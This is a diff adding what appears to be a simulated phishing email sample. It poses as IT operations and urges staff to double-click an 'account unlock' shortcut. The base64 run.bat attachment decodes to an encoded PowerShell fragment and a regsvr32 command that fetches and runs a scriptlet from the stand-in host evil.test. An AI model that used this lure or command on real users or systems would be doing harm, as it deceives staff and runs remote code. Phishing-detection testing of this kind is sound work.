@@ -1,0 +1,35 @@
+From: =?utf-8?B?SVQg6L+Q57u0?= <ops@corp.example.com>
+To: staff@corp.example.com
+Subject: =?utf-8?B?5Z+f6LSm5Y+36Kej6ZSB5bel5YW3?=
+Date: Sat, 14 Nov 2026 17:27:01 GMT
+Message-ID: <54c15142e317bcfa6c@evil.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_1c04bfed38ae0f60"
+Received: from edge.corp.example.com (edge.corp.example.com [10.0.0.1])
+	by mailgw.internal.local with ESMTPS id EV2;
+	Sat, 14 Nov 2026 17:27:04 GMT
+Received: from bulk-mailer.evil.test (bulk-mailer.evil.test [45.9.148.77])
+	by edge.corp.example.com with ESMTP id EV1;
+	Sat, 14 Nov 2026 17:27:01 GMT
+Return-Path: <ops@bulk-mailer.evil.test>
+
+------=_Part_1c04bfed38ae0f60
+Content-Type: text/plain; charset=utf-8
+
+双击附件解锁账号。
+
+------=_Part_1c04bfed38ae0f60
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="账号解锁.lnk"
+
+0M8R4KGxGuFMTksgc2ltdWxhdGVkIHRhcmdldDogY21kLmV4ZSAvYyBwb3dlcnNoZWxsLCB3b3Jr
+aW5nIGRpciBBcHBEYXRhXFRlbXANCg==
+------=_Part_1c04bfed38ae0f60
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="run.bat"
+
+QGVjaG8gb2ZmDQpwb3dlcnNoZWxsIC1lbmMgU1FCRkFGZ0ENCnJlZ3N2cjMyIC9zIC91IC9pOmh0
+dHA6Ly9ldmlsLnRlc3QveC5zY3Qgc2Nyb2JqLmRsbA0K
+------=_Part_1c04bfed38ae0f60--
